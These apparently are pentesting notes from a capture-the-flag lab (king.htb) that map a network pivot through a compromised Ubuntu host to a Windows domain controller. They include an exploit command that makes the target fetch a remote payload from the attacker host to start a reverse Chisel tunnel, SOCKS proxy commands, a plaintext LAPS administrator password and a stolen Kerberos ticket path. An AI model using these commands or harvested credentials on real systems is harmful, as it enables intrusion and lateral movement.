# Network Topology

| Host/IP | Interfaces | Active Tunnels | Credentials/Hashes |
|---------|-----------|----------------|-------------------|
| 10.129.1.8 / 172.16.1.100 (mq - Ubuntu 20.04) | eth0: 172.16.1.100/16 | Reverse Chisel client → 10.10.14.2:7777 | svc_mq@king.htb (TGT at /tmp/krb5cc_1600801117_Qxs0zd) |
| 172.16.1.1 (openAD.king.htb - Windows DC) | — | Via chisel pivot | unknown (admin) |
| 172.16.1.101 (sql.king.htb - Windows) | — | OFFLINE | SQL$ local admin: r%msnCet4EA5#J (LAPS) |
| 10.10.14.2 (attacker) | tun0 | Chisel server :7777 → SOCKS5 :1080 | — |

## Active Chisel Reverse Tunnel Setup
- **Attacker server cmd:** `/home/takashi/.local/bin/chisel server --port 7777 --reverse` (NO --socks5 flag — v1.7.3 crashes with it)
- **Target client trigger:** `python3 exploit.py 10.129.1.8 61616 "http://10.10.14.2:8080/pivot_rev.xml"`
- **SOCKS5 proxy on attacker:** `127.0.0.1:1080`
- **Proxychains config:** `/tmp/pc_chisel.conf`
- **Verify tunnel:** `proxychains4 -f /tmp/pc_chisel.conf curl -s http://172.16.1.1/` → returns HTML

## DC Ports Confirmed Open (from mq direct, not via SOCKS)
80, 8530 (WSUS HTTP), 8531 (WSUS HTTPS), 5985 (WinRM), 135, 593, 9389, 464, 53, 88, 389, 445, 636, 3268, 3269

## DC Ports Accessible via SOCKS Tunnel (confirmed working)
445, 389, 636 — SMB/LDAP works fine via proxychains
8530 — WSUS accessible but slow; NTLM auth works; SOAPAction format issue prevents API calls
5985 — WinRM accessible but domain users lack WinRM access rights
